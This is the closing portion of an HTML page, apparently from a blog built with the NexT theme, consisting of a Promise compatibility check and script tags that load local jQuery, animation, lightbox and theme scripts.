  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="true"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
